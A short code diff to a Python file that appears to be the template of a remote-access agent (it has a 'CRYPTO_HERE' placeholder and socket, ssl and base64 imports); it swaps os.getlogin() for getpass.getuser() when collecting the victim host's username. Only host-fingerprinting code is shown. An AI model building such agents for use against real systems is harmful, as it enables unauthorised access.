@@ -1,4 +1,4 @@
-import os, random, sys, json, socket, base64, time, platform, ssl
+import os, random, sys, json, socket, base64, time, platform, ssl, getpass
 import urllib.request
 from datetime import datetime
 import threading, queue
@@ -12,7 +12,7 @@ CRYPTO_HERE
         else: return platform.system() + " " + platform.release()
 
     def getUsername(self):
-        try: return os.getlogin() 
+        try: return getpass.getuser()
         except: pass
         for k in [ "USER", "LOGNAME", "USERNAME" ]: 
             if k in os.environ.keys(): return os.environ[k]
